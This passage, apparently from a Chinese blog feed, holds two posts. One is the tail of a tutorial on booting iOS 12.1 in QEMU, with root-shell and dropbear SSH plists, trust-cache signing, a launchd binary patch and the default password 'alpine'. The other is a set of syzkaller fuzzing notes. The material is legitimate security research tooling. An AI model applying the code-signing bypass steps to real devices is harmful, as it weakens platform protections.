encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;&lt;plist version=&quot;1.0&quot;&gt;&lt;dict&gt; &lt;key&gt;EnablePressuredExit&lt;/key&gt; &lt;false/&gt; &lt;key&gt;Label&lt;/key&gt; &lt;string&gt;com.apple.bash&lt;/string&gt; &lt;key&gt;POSIXSpawnType&lt;/key&gt; &lt;string&gt;Interactive&lt;/string&gt; &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt; &lt;string&gt;/iosbinpack64/bin/bash&lt;/string&gt; &lt;/array&gt; &lt;key&gt;RunAtLoad&lt;/key&gt; &lt;true/&gt; &lt;key&gt;StandardErrorPath&lt;/key&gt; &lt;string&gt;/dev/console&lt;/string&gt; &lt;key&gt;StandardInPath&lt;/key&gt; &lt;string&gt;/dev/console&lt;/string&gt; &lt;key&gt;StandardOutPath&lt;/key&gt; &lt;string&gt;/dev/console&lt;/string&gt; &lt;key&gt;Umask&lt;/key&gt; &lt;integer&gt;0&lt;/integer&gt; &lt;key&gt;UserName&lt;/key&gt; &lt;string&gt;root&lt;/string&gt;&lt;/dict&gt;&lt;/plist&gt; mount_sec - 挂载辅助块设备（disk1） 创建plist文件并将其另存为/Volumes/PeaceB16B92.arm64UpdateRamDisk/System/Library/LaunchDaemons/mount_sec.plist。 1234567891011121314151617181920212223242526272829&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;&lt;plist version=&quot;1.0&quot;&gt;&lt;dict&gt; &lt;key&gt;CFBundleIdentifier&lt;/key&gt; &lt;string&gt;com.apple.mount_sec&lt;/string&gt; &lt;key&gt;EnablePressuredExit&lt;/key&gt; &lt;false/&gt; &lt;key&gt;EnableTransactions&lt;/key&gt; &lt;false/&gt; &lt;key&gt;HighPriorityIO&lt;/key&gt; &lt;true/&gt; &lt;key&gt;Label&lt;/key&gt; &lt;string&gt;mount_sec&lt;/string&gt; &lt;key&gt;POSIXSpawnType&lt;/key&gt; &lt;string&gt;Interactive&lt;/string&gt; &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt; &lt;string&gt;/sbin/mount&lt;/string&gt; &lt;string&gt;/private/var&lt;/string&gt; &lt;/array&gt; &lt;key&gt;RunAtLoad&lt;/key&gt; &lt;true/&gt; &lt;key&gt;Umask&lt;/key&gt; &lt;integer&gt;0&lt;/integer&gt; &lt;key&gt;UserName&lt;/key&gt; &lt;string&gt;root&lt;/string&gt;&lt;/dict&gt;&lt;/plist&gt; tcptunnel - 在主机和guest之间的端口 2222 上打开 TCP 隧道。SSH 将在此隧道之上运行。 创建plist文件并将其另存为/Volumes/PeaceB16B92.arm64UpdateRamDisk/System/Library/LaunchDaemons/tcptunnel.plist。 12345678910111213141516171819202122232425262728293031&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;&lt;plist version=&quot;1.0&quot;&gt;&lt;dict&gt; &lt;key&gt;CFBundleIdentifier&lt;/key&gt; &lt;string&gt;com.apple.tcptunnel&lt;/string&gt; &lt;key&gt;EnablePressuredExit&lt;/key&gt; &lt;false/&gt; &lt;key&gt;EnableTransactions&lt;/key&gt; &lt;false/&gt; &lt;key&gt;HighPriorityIO&lt;/key&gt; &lt;false/&gt; &lt;key&gt;KeepAlive&lt;/key&gt; &lt;true/&gt; &lt;key&gt;Label&lt;/key&gt; &lt;string&gt;TcpTunnel&lt;/string&gt; &lt;key&gt;POSIXSpawnType&lt;/key&gt; &lt;string&gt;Interactive&lt;/string&gt; &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt; &lt;string&gt;/bin/tunnel&lt;/string&gt; &lt;string&gt;2222:127.0.0.1:22&lt;/string&gt; &lt;/array&gt; &lt;key&gt;RunAtLoad&lt;/key&gt; &lt;true/&gt; &lt;key&gt;Umask&lt;/key&gt; &lt;integer&gt;0&lt;/integer&gt; &lt;key&gt;UserName&lt;/key&gt; &lt;string&gt;root&lt;/string&gt;&lt;/dict&gt;&lt;/plist&gt; dropbear - 将用作 SSH 服务器。 创建plist文件并将其另存为/Volumes/PeaceB16B92.arm64UpdateRamDisk/System/Library/LaunchDaemons/dropbear.plist。 1234567891011121314151617181920212223242526272829303132333435&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;&lt;plist version=&quot;1.0&quot;&gt;&lt;dict&gt; &lt;key&gt;CFBundleIdentifier&lt;/key&gt; &lt;string&gt;com.apple.dropbear&lt;/string&gt; &lt;key&gt;EnablePressuredExit&lt;/key&gt; &lt;false/&gt; &lt;key&gt;EnableTransactions&lt;/key&gt; &lt;false/&gt; &lt;key&gt;HighPriorityIO&lt;/key&gt; &lt;true/&gt; &lt;key&gt;KeepAlive&lt;/key&gt; &lt;true/&gt; &lt;key&gt;Label&lt;/key&gt; &lt;string&gt;Dropbear&lt;/string&gt; &lt;key&gt;POSIXSpawnType&lt;/key&gt; &lt;string&gt;Interactive&lt;/string&gt; &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt; &lt;string&gt;/iosbinpack64/usr/local/bin/dropbear&lt;/string&gt; &lt;string&gt;--shell&lt;/string&gt; &lt;string&gt;/iosbinpack64/bin/bash&lt;/string&gt; &lt;string&gt;-R&lt;/string&gt; &lt;string&gt;-E&lt;/string&gt; &lt;string&gt;-F&lt;/string&gt; &lt;/array&gt; &lt;key&gt;RunAtLoad&lt;/key&gt; &lt;true/&gt; &lt;key&gt;Umask&lt;/key&gt; &lt;integer&gt;0&lt;/integer&gt; &lt;key&gt;UserName&lt;/key&gt; &lt;string&gt;root&lt;/string&gt;&lt;/dict&gt;&lt;/plist&gt; 现在需要确保系统中的所有二进制文件都根据它们在ProgramArguments描述的那样，在对应的位置上。 /iosbinpack64/bin/bash- iosbinpack64 的一部分 /sbin/mount- iOS系统的一部分 /bin/tunnel 12345cd xnu-qemu-arm64-tools/tcp-tunnelexport IOS_DIR=./iPhone_5.5_12.1_16B92_Restoremakesudo cp bin/tunnel /Volumes/PeaceB16B92.arm64UpdateRamDisk/bin/tunnelcd - /iosbinpack64/usr/local/bin/dropbear- iosbinpack64 的一部分 5. 关于静态信任缓存的注意事项由于要运行的是一个未打补丁的内核，要在不修补内核的情况下运行未经 Apple 签名的二进制文件，必须创建一个静态 Trust Cache 文件。静态信任缓存是系统信任的签名列表，并允许执行使用这些签名签名的二进制文件。 签名 /bin/tunnel 1sudo jtool --sign --ent ent.xml --inplace /Volumes/PeaceB16B92.arm64UpdateRamDisk/bin/tunnel 签名文件 123456789&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;&lt;plist version=&quot;1.0&quot;&gt; &lt;dict&gt; &lt;key&gt;platform-application&lt;/key&gt; &lt;true/&gt; &lt;key&gt;com.apple.private.security.container-required&lt;/key&gt; &lt;false/&gt; &lt;/dict&gt;&lt;/plist&gt; 一般变化 替换 fstab 文件 12sudo cp /Volumes/PeaceB16B92.arm64UpdateRamDisk/etc/fstab /Volumes/PeaceB16B92.arm64UpdateRamDisk/etc/fstab_origsudo vim /Volumes/PeaceB16B92.arm64UpdateRamDisk/etc/fstab 从文件中删除内容并复制以下内容 12/dev/disk0 / hfs ro 0 1/dev/disk1 /private/var hfs rw,nosuid,nodev 0 2 防止 keybagd 守护程序在系统启动时运行 1sudo rm /Volumes/PeaceB16B92.arm64UpdateRamDisk/System/Library/LaunchDaemons/com.apple.mobile.keybagd.plist 6. 修补已启动的二进制文件为了launchd加载我们之前添加的程序，需要对二进制文件xpcd_cache.dylib打补丁。 将二进制文件/Volumes/PeaceB16B92.arm64UpdateRamDisk/sbin/launchd倒入Ghidra并分析它。将0x10002fb18处的指令 cset w20,ne改为mov w20,#0x01。保存修改后的二进制文件，替换原始文件。 12sudo mv /Volumes/PeaceB16B92.arm64UpdateRamDisk/sbin/launchd /Volumes/PeaceB16B92.arm64UpdateRamDisk/sbin/launchd.origsudo cp launchd.bin /Volumes/PeaceB16B92.arm64UpdateRamDisk/sbin/launchd 使用 jtool 对二进制文件进行签名，从原始文件中获取权利launchd（之前的 ent.xml 也可以使用）。 1sudo jtool --sign --ent ent.xml --ident com.apple.xpc.launchd --inplace /Volumes/PeaceB16B92.arm64UpdateRamDisk/sbin/launchd 弹出磁盘。 12hdiutil detach /Volumes/PeaceB16B92.arm64UpdateRamDiskhdiutil detach /Volumes/PeaceB16B92.N56N66OS 7. 创建辅助磁盘设备与主磁盘一样，我们也可以使用 ramdisk 结构。 1234cp iPhone_5.5_12.1_16B92_Restore/048-32651-104.dmg.out ./hfs.sechdiutil resize -size 6G -imagekey diskimage-class=CRawDiskImage ./hfs.sechdiutil attach -imagekey diskimage-class=CRawDiskImage ./hfs.sechdiutil attach iPhone_5.5_12.1_16B92_Restore/048-31952-103.dmg 删除 ramdisk 的所有内容并将 ramdisk 与/private/var主磁盘映像中的目录同步。 12sudo rm -rf /Volumes/PeaceB16B92.arm64UpdateRamDisk/*sudo rsync -av /Volumes/PeaceB16B92.N56N66OS/private/var/* /Volumes/PeaceB16B92.arm64UpdateRamDisk/ 为 dropbear 创建一个目录 1sudo mkdir /Volumes/PeaceB16B92.arm64UpdateRamDisk/dropbear 弹出磁盘 12hdiutil detach /Volumes/PeaceB16B92.arm64UpdateRamDiskhdiutil detach /Volumes/PeaceB16B92.N56N66OS 第六步，QEMU1234cd xnu-qemu-arm64./configure --target-list=aarch64-softmmu --disable-capstone --disable-pie --disable-slirpmake -j8cd - 启动 1xnu-qemu-arm64/aarch64-softmmu/qemu-system-aarch64 -M iPhone6splus-n66-s8000,kernel-filename=iPhone_5.5_12.1_16B92_Restore/kernelcache.release.n66.out,dtb-filename=iPhone_5.5_12.1_16B92_Restore/Firmware/all_flash/DeviceTree.n66ap.im4p.out,driver-filename=xnu-qemu-arm64-tools/aleph_bdev_drv/bin/aleph_bdev_drv.bin,qc-file-0-filename=hfs.main,qc-file-1-filename=hfs.sec,kern-cmd-args=&quot;debug=0x8 kextlog=0xfff cpus=1 rd=disk0 serial=2&quot;,xnu-ramfb=off -cpu max -m 6G -serial mon:stdio 一切正常的话，ssh应该已经启动了，这时只需要通过ssh连接本地2222端口即可，密码是alpine。 后记正常使用bash命令需要设置环境变量： 1export PATH=$PATH:/iosbinpack64/usr/bin:/iosbinpack64/bin:/iosbinpack64/usr/sbin:/iosbinpack64/sbin 为了简化工作流程，值得将二进制文件从iosbinpack64/bin,iosbinpack64/usr/bin等符号链接到相应/bin的 ,/usr/bin等目录中。 需要自己解决一下scp的问题，因为，每次启动qemu，环境变量是没有的，scp肯定是不行，这里就是直接复制到/usr/bin/目录下。 ⚠️因为没有优雅的关闭系统，所以hfs.sec是挂载到 iOS 上的，关闭QEMU后，再次挂载会失败。因此，当系统重新启动时，需要在 mac 上挂载和卸载磁盘。 12hdiutil attach -imagekey diskimage-class=CRawDiskImage hfs.sechdiutil detach /Volumes/PeaceB16B92.arm64UpdateRamDisk 如果想要进行调试，需要在QEMU的命令行中添加-S -s，具体可以参考这里。 参考文章Build iOS on QEMU Almost booting an iOS kernel in QEMU Running iOS in QEMU to an interactive bash shell (1) Tunnelling TCP connections into iOS on QEMU","link":"/2022/02/26/qemu-xnu%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"title":"syzkaller学习笔记","text":"前言之前看过AFL++的源码，发现想要自己重新写的话还是很复杂，现在学习一下syzkaller，看看有没有可能进行定制。 原理syzkaller系统的流程结构如下图所示；红色标签表示相应的配置选项。 syz-manager进程启动、监控和重启几个虚拟机实例，并在虚拟机内启动syz-fuzzer进程。syz-manager负责持久性语料库和崩溃存储。它运行在一个具有稳定内核的主机上，不会出现白噪声模糊器的负载。 syz-fuzzer进程在可能不稳定的虚拟机中运行。syz-fuzzer指导模糊处理过程（输入生成、突变、最小化等），并通过RPC将触发新覆盖率的输入发送至syz-manager进程。它还会启动瞬时的syz-executor进程。 每个syz-executor进程执行一个输入（一连串的系统调用）。它从syz-fuzzer进程中接受要执行的程序，并将结果发送回来。它被设计成尽可能简单（不干扰模糊处理过程），用C++编写，编译成静态二进制，使用共享内存进行通信。 系统调用描述syz-fuzzer进程根据系统调用描述，生成由syz-executor执行的程序。 覆盖率Syzkaller是一个覆盖率导向的fuzzer。 崩溃报告当syzkaller发现一个崩溃者时，它会将其信息保存到workdir/crashes目录中。该目录为每一个独特的崩溃类型包含一个子目录。每个子目录都包含一个描述文件，其中有一个唯一的字符串来标识崩溃（用于识别错误和重复计算）；还有多达100个logN和reportN文件，每个测试机崩溃一对。 12345678910111213- crashes/ - 6e512290efa36515a7a27e53623304d20d1c3e - description - log0 - report0 - log1 - report1 ... - 77c578906abe311d06227b9dc3bffa4c52676f - description - log0 - report0 ... 描述是使用一组正则表达式来提取的。如果你使用的是不同的内核架构，或者只是看到了以前没有见过的内核错误信息，那么这个集合可能需要被扩展。 logN文件包含原始的syzkaller日志，包括内核控制台输出以及崩溃前执行的程序。这些日志可以提供给syz-repro工具进行崩溃定位和最小化，或者提供给syz-execprog工具进行手动定位。reportN文件包含经过处理和符号化的内核崩溃报告（例如KASAN报告）。通常你只需要一对这样的文件（即log0和report0），因为它们都可能是描述同一个内核错误。然而，syzkaller会保存多达100个这样的文件，以应对崩溃重现性差的情况，或者你只是想看一组崩溃报告来推断一些相似性或差异。 有3种特殊的崩溃类型： 测试机没有输出：测试机没有产生任何输出； 与测试机失去连接：与测试机的SSH连接意外地关闭了； 测试机没有执行程序：机器看起来还活着，但长时间没有执行测试程序。 最有可能的是，你不会看到这些reportN文件（例如，如果测试机器没有输出，就没有什么可以写进报告）。有时这些崩溃表明syzkaller本身有错误（特别是当你在日志中看到Go panic消息时）。然而，通常情况下，它们意味着内核锁死或类似的坏情况（这里有几个这样发现的bug的例子：1，2，3）。 环境搭建git源码： 1https://github.com/google/syzkaller 直接make即可，但是由于没有设置SOURCEDIR，所以Executor无法编译： 123Executor will not be builtNative cross-compiler is missing/broken:SOURCEDIR is not set 运行启动syz-manager： 1./bin/syz-manager -config my.cfg 配置文件json格式，具体包含哪些参数可以在syzkaller/pkg/mgrconfig/config.go中进行查看，示例文件如下： 12345678910111213141516171819{ &quot;target&quot;: &quot;linux/amd64&quot;, &quot;http&quot;: &quot;myhost.com:56741&quot;, &quot;workdir&quot;: &quot;/syzkaller/workdir&quot;, &quot;kernel_obj&quot;: &quot;/linux/&quot;, &quot;image&quot;: &quot;./testdata/wheezy.img&quot;, &quot;syzkaller&quot;: &quot;./testdata/syzkaller&quot;, &quot;disable_syscalls&quot;: [&quot;keyctl&quot;, &quot;add_key&quot;, &quot;request_key&quot;], &quot;suppressions&quot;: [&quot;some known bug&quot;], &quot;procs&quot;: 4, &quot;type&quot;: &quot;qemu&quot;, &quot;vm&quot;: { &quot;count&quot;: 16, &quot;cpu&quot;: 2, &quot;mem&quot;: 2048, &quot;kernel&quot;: &quot;/linux/arch/x86/boot/bzImage&quot;, &quot;initrd&quot;: &quot;linux/initrd&quot; }} Crash一旦 syzkaller 在其中一个 VM 中检测到内核Crash，它将自动启动复现这个Crash的过程（除非配置文件中指定了&quot;reproduce&quot;: false）。默认情况下，syzkaller将使用 4 个虚拟机来复现Crash，然后最小化POC。由于可能所有虚拟机都在进行复现过程，从而使fuzz停止。 自动复现Crash的时间可能无法控制，所以可以选择手动复现。 如果复现成功，syzkaller将给出两种POC：syzkaller 程序或 C 程序，默认是C程序。如果是syzkaller 程序，则运行和调试的方法在这里。 复现Crash为syzkaller bug创建复制程序的过程是自动化的，然而它并不完美，所以syzkaller提供了一些手动执行和复制程序的工具。 在管理器workdir/crashes dir中创建的崩溃日志包含了崩溃前刚刚执行的程序。在并行执行模式下（当管理器配置中的procs参数设置为大于1的值时），导致崩溃的程序不一定紧接在它之前；有罪的程序可能在之前的某个地方。有两个工具可以帮助你识别和减少导致崩溃的程序：tools/sy-execprog和tools/sy-prog2c。 tools/syz-execprog执行单个syzkaller程序或一组不同模式的程序（一次或无限次循环；线程/碰撞模式（见下文），有无覆盖率收集）。你可以先循环运行崩溃日志中的所有程序，检查其中至少有一个程序确实崩溃了内核：./syz-execprog -executor=./syz-executor -repeat=0 -procs=16 -cover=0 crash-log。然后尝试找出导致崩溃的单个程序，你可以用./syz-execprog -executor=./syz-executor -repeat=0 -procs=16 -cover=0 file-with-a-single-program测试程序。 注意：syz-execprog是在本地执行程序。所以你需要把syz-execprog和syz-executor复制到一个有测试内核的虚拟机中，并在那里运行它。 一旦有了一个导致崩溃的程序，试着从程序中删除个别的系统调用（可以在行首用#注释单行），并删除不必要的数据（例如用&amp;(0x7f0000001000)=&quot;73656c6600 &quot;系统调用参数替换&amp;(0x7f0000001000)=nil），从而使其最小化。你也可以尝试把所有的mmap调用凝聚成一个单一的mmap调用来映射整个需要的区域。同样，用syz-execprog工具测试最小化。 现在有了一个最小化的程序，用./syz-execprog -threaded=0 -collide=0标志检查崩溃是否还能重现。如果不是，那么你将需要在后面做一些额外的工作。 现在，对该程序运行syz-prog2c工具。它将给你可执行的C语言源代码。如果崩溃在-threaded/collide=0标记下重现，那么这个C程序也应该导致崩溃。 如果崩溃在-threaded/collide=0标记下不能重现，那么你需要最后一步。你可以把线程模式看作是每个系统调用都在自己的线程中执行。为了模拟这样的执行模式，将各个系统调用移到独立的线程中。你可以在这里看到一个例子：https://groups.google.com/d/msg/syzkaller/fHZ42YrQM-Y/Z4Xf-BbUDgAJ。 这个过程在某种程度上在syz-repro工具中是自动化的。你需要给它你的管理器配置和崩溃报告文件。而且你可以参考配置文件的例子： 1./syz-repro -config my.cfg crash-qemu-1-145574545926572691 它将试图找到违规的程序并将其最小化。但由于有很多因素会影响重现性，它并不总是有效。 Hub对于多个syz-manager实例，应该是对应的分布式fuzz。 syz-hub程序可以用来把几个syz-manager连接在一起，让它们交换程序。 用make hub建立syz-hub。然后创建一个配置文件，其内容如下。 12345678910{ &quot;http&quot;: &quot;:80&quot;, &quot;rpc&quot;: &quot;:55555&quot;, &quot;workdir&quot;: &quot;/syzkaller/workdir&quot;, &quot;clients&quot;: [ {&quot;name&quot;: &quot;manager1&quot;, &quot;key&quot;: &quot;6sCFsJVfyFQVhWVKJpKhHcHxpCH0gAxL&quot;}, {&quot;name&quot;: &quot;manager2&quot;, &quot;key&quot;: &quot;FZFSjthHHf8nKm2cqqAcAYKM5a3XM4Ao&quot;}, {&quot;name&quot;: &quot;manager3&quot;, &quot;key&quot;: &quot;fTrIBQCmkEq8NsvQXZiOUyop6uWLBuzf&quot;} ]} 然后用bin/syz-hub -config hub.cfg启动它。在每个管理器的syz-manager配置文件中添加以下附加参数。 1234&quot;name&quot;: &quot;manager1&quot;,&quot;hub_client&quot;: &quot;manager1&quot;,&quot;hub_addr&quot;: &quot;1.2.3.4:55555&quot;,&quot;hub_key&quot;: &quot;6sCFsJVfyFQVhWVKJpKhHcHxpCH0gAxL&quot;, 启动syz-manager。一旦他们对本地语料库进行分流，他们将连接到hub并开始交换输入。hub和syz-manager的网页都会显示他们从hub发送/接收了多少输入。 设置syzkallerAkaros、 FreeBSD、 Fuchsia、 NetBSD、 OpenBSD、 Windows、Linux。 运行，访问http://127.0.0.1:56741： 123456789101112$ ./bin/syz-manager -config=my.cfg2017/06/14 16:39:05 loading corpus...2017/06/14 16:39:05 loaded 0 programs (0 total, 0 deleted)2017/06/14 16:39:05 serving http on http://127.0.0.1:567412017/06/14 16:39:05 serving rpc on tcp://127.0.0.1:349182017/06/14 16:39:05 booting test machines...2017/06/14 16:39:05 wait for the connection from test machine...2017/06/14 16:39:59 received first connection from test machine vm-92017/06/14 16:40:05 executed 293, cover 43260, crashes 0, repro 02017/06/14 16:40:15 executed 5992, cover 88463, crashes 0, repro 02017/06/14 16:40:25 executed 10959, cover 116991, crashes 0, repro 02017/06/14 16:40:35 executed 15504, cover 132403, crashes 0, repro 0 故障排除检查运行的 syzkaller 是否有问题： 使用-debug命令行选项，使 syzkaller 从syz-manager顶层程序和syz-fuzzer实例打印所有可能的调试输出。使用此选项 syzkaller 将只运行一个 VM 实例。 使用-vv N命令行选项，增加syz-manager顶层程序和syz-fuzzer实例（转到crashes工作目录子目录中的输出文件）的日志输出量。N 值越高，输出越多。 如果日志记录表明执行程序存在问题（例如executor failure），尝试手动运行一小段系统调用： 复制syz-executor和syz-execprog到正在运行的 VM中。 在 VM 中运行./syz-execprog -executor ./syz-executor -debug sampleprog，sampleprog 是一个简单的系统调用脚本（例如只包含getpid()）。 例如，如果报告clone失败，这可能表明测试内核不支持所有必需的命名空间。在这种情况下，syz-execprog使用该选项运行测试-sandbox=setuid可以解决问题，因此需要将主配置更新为设置sandbox为setuid. 有关 Linux 内核特定的故障排除建议，可以参考这里。 研究看这里。 技术会谈和文章看这里。 syzbot这是一个机器人，用于持续的fuzz多个内核。详细的内容参考这里。 代码在这里。架构如下： syz_verifiersyz-verifier是一种差分模糊测试工具，可以交叉比较程序在不同版本的 Linux 内核上的执行情况，以检测语义错误。架构如下： syz-verifier进程启动并管理带有要进行交叉比较的内核的虚拟机实例。它也会启动虚拟机上的syz-runner进程。host和client之间的通信是通过RPC完成的。 syz-verifier生成并通过RPC向syz-runner连续发送程序，而syz-runner则负责启动syz-executor进程，并将程序转化为这些程序的输入。syz-executor处理输入，从而触发内核中一系列的syscall。然后，syz-runner收集结果并将其送回host。 目前，这些结果包含了每个系统调用返回的errnos。当syz-verifier收到所有内核对某一特定程序的运行结果后，它会对其进行验证以确保它们是相同的。如果发现不相同，就在所有内核上重新运行该程序，以确保不相同不是片状的（即不是因为某些背景活动或外部状态而发生的）。如果在所有的重新运行中都出现了不匹配，syz-verifier就会为该程序创建一份报告，并将其写入persistent storage。 如何使用syz-verifier源码下载完后，直接make。 要开始使用该工具，需要为要包含在验证中的每个内核创建单独的配置文件。可以在此处找到 Linux 配置的示例。 如果想从一组特定的系统调用中生成程序，可以使用enable_syscalls选项在内核配置文件中列出这些调用。如果想禁用某些系统调用，可以使用disable_syscalls选项。 运行syz-verifier： 1./bin/syz-verifier -configs=kernel0.cfg,kernel1.cfg syz-verifier在执行过程中会收集统计数据。默认情况下，这些数据会被打印到stdout，也可以用stat标志来指定文件。 如何解释结果结果在workdir/results中。 当syz-verifier在程序中发现不匹配时，它将为该程序创建一个报告。该报告列出了每个系统调用返回的结果，由每个交叉比较的内核，突出显示发现不匹配的结果。系统调用按照它们在程序中出现的顺序列出。例如： 1234567891011121314ERRNO mismatches found for program:[=] io_uring_register$IORING_REGISTER_PERSONALITY(0xffffffffffffffff, 0x9, 0x0, 0x0) ↳ Pool: 0, Flags: 3, Errno: 9 (bad file descriptor) ↳ Pool: 1, Flags: 3, Errno: 9 (bad file descriptor)[=] syz_genetlink_get_family_id$devlink(&amp;(0x7f0000000000), 0xffffffffffffffff) ↳ Pool: 0, Flags: 3, Errno: 2 (no such file or directory) ↳ Pool: 1, Flags: 3, Errno: 2 (no such file or directory)[!] r1 = io_uring_setup(0x238e, &amp;(0x7f0000000240)={0x0, 0xf39a, 0x20, 0x0, 0x146}) ↳ Pool: 0, Flags: 3, Errno: 6 (no such device or address) ↳ Pool: 1, Flags: 3, Errno: 9 (bad file descriptor)... 结果的顺序是由配置文件传递的顺序决定的，所以Pool: 0表示使用kernel0.cfg创建的内核所产生的结果，以此类推。 Flags可用于确定系统调用达到的状态： 0= 系统调用甚至没有开始 1= 系统调用开始 3= 系统调用完成执行 7= 系统调用被阻止 syz-testbedsyz-testbed是一种评估不同 syzkaller 版本（或配置）性能的工具。该工具自动检查 syzkaller 存储库、构建它们、运行 syz-manager并收集/总结它们的结果。详见这里。 Syscall描述syzkaller使用系统调用接口的声明性描述来操作程序（系统调用序列）。例如： 1234open(file filename, flags flags[open_flags], mode flags[open_mode]) fdread(fd fd, buf buffer[out], count len[buf])close(fd fd)open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH 描述包含在sys/$OS/*.txt文件中。例如，有关 Linux MIDI 接口的描述，参考sys/linux/dev_snd_midi.txt。 程序然后使用翻译后的描述来生成、变异、执行、最小化、序列化和反序列化程序。程序是具有具体参数具体值的系统调用序列。这是一个程序的示例： 123r0 = open(&amp;(0x7f0000000000)=&quot;./file0&quot;, 0x3, 0x9)read(r0, &amp;(0x7f0000000000), 42)close(r0) 在实际操作中，syzkaller使用类似AST的内存表示法，由prog/prog.go中定义的Call和Arg值组成。这种表示法被用来分析、生成、变异、最小化、验证等程序。 内存中的表示法可以转换为文本形式，以存储在磁盘语料库中，并进行展示，等等。 还有另一种程序的二进制表示法（称为exec），它更简单，不包含丰富的类型信息（不可逆），用于由executor实际执行（解释）程序。 描述新的系统调用本节介绍如何扩展 syzkaller 以允许对更多内核接口进行模糊测试。 目前，所有的系统调用描述都是手动编写的。有一个开放的问题是为这个过程提供一些帮助，以及一些正在进行的工作，但我们还没有达到完全自动化的方式来生成描述。有一个headerparser工具，可以从头文件中自动生成部分描述。 实现对一个新的内核接口的模糊处理。 研究该接口，找出使用该接口需要哪些系统调用。有时除了源代码外，什么都没有，但以下的东西可能会有帮助： 在互联网上搜索接口的名称和/或一些独特的常数。 在内核中搜索Documentation/ dir。 搜索内核中的tool/testing/ dir。 寻找源代码中的大型注释块。 通过git blame或git log找到添加接口的提交，并阅读提交描述。 阅读或追踪已知使用该接口的库或应用程序的源代码。 以语法文档和现有的描述为例，在相应的文件中添加该接口的声明性描述： sys/linux/&lt;subsystem&gt;.txt文件保存了特定内核子系统的系统调用，例如bpf.txt或socket.txt。 sys/linux/sys.txt文件保存了更多通用系统调用的描述。 一个全新的子系统可以作为一个新的sys/linux/&lt;new&gt;.txt文件被添加。 如果子系统的描述被分割成多个文件，请在每个文件的名称前加上子系统的名称（例如，使用dev_*.txt描述/dev/设备，使用socket_*.txt描述socket，等等）。 添加/更改描述后运行。 123make extract TARGETOS=linux SOURCEDIR=$KSRCmake generatemake 运行syzkaller。确保新添加的接口被syzkaller通过覆盖信息页面到达。 在上面的说明中，make extract生成/更新了*.const文件。$KSRC应该指向最新的内核。注意：对于Linux来说，最新的内核通常是指主线树。然而，在某些情况下，我们会添加一些尚未在主线树中出现的接口描述，所以如果make extract抱怨缺少头文件或常量在所有架构上都未定义，请尝试使用最新的linux-next树（或者如果它恰好在此时被破坏，请尝试稍旧的linux-next树）。注意：make extract会覆盖$KSRC中的.config，而mrproper则会覆盖它。注意：*.const文件与*.txt的修改在同一提交中被commit。 然后make generate更新生成的代码，make重新构建二进制文件。注意：make generate不需要任何内核源、本地编译器等，是纯文本处理。注意：make generate还会更新executor/defs.h下的SYZ_REVISION，这是运行syz-manager时机器检查所需要的。尤其是当你试图用你自己对系统调用的描述进行修改来重新建立数据库时，更应该注意这一点。 注意：make extract会提取所有需要安装交叉编译器的架构的常量。如果你遇到关于缺少编译器/库的错误，请尝试sudo make install_prerequisites或者为你的发行版安装相应的软件包。注意：sudo make install_prerequisites即使在某些软件包安装失败的情况下也会成功，sudo apt-get update &amp;&amp; sudo apt-get upgrade可能是为了使其更有效。 如果你只想对你在本地描述的新子系统进行模糊处理，你可能会发现enable_syscalls配置参数对专门针对新的系统调用很有用。enable_syscalls列表中的所有系统调用都将被启用，如果它们的要求被满足的话（也就是说，如果它们在目标机器中被支持，并且任何其他需要运行以便为其提供输入的系统调用也被启用）。你也可以包括通配符定义，在一行中启用多个系统调用，例如。&quot;ioctl &quot;将启用所有符合要求的ioctls系统调用，&quot;ioctl$UDMABUF_CREATE &quot;只启用那个特定的ioctl调用，&quot;write$UHID_*&quot;启用所有以该描述标识符开头的写系统调用。 在更新现有的syzkaller描述时，请注意，除非某个特定的系统调用的描述有很大的变化，否则已经在语料库中的程序会被保留下来，除非你手动将它们清除掉（例如通过删除corpus.db文件）。 Tips and FAQSyscall, struct, field, flags 名称尽量使用现有的内核名称，如果可能，不要发明新的名称。 遵循既定的命名规则有以下好处。(1) 内核接口中使用的名字的一致性和熟悉性，这也使得能够在内核资源中搜索相关的名字；(2) 能够用syz-check对描述进行静态检查（例如，遗漏的标志或错误的字段）。 例如，如果在内核头文件中有一个现有的枚举v4l2_buf_type，那么在描述中也使用这个名字的标志。对于结构体、联合体、字段等也是如此。对于系统调用和结构的变体，在$符号后面加上变体名称。例如，fcntl$F_GET_RW_HINT, ioctl$FIOCLEX, setsockopt$SO_TIMESTAMP。 系统调用的资源顺序资源和资源方向（in, out,inout）对参与的系统调用施加了隐含的排序约束。 如果一个系统调用接受一个特定类型的资源（例如，将fd_cdrom作为输入），那么它通常会被放在将该资源作为输出的系统调用之后，这样资源值就可以在系统调用之间传递。比如说： 123r0 = openat$cdrom(...)ioctl$CDROMPAUSE(r0, 0x123)close(r0) 系统调用的参数总是输入的，返回值是输出的，指针间接性有明确的方向作为ptr类型属性。此外，还可以为结构字段单独指定方向属性，以考虑到更复杂的生产者/消费者场景，包括输入/输出资源的结构。 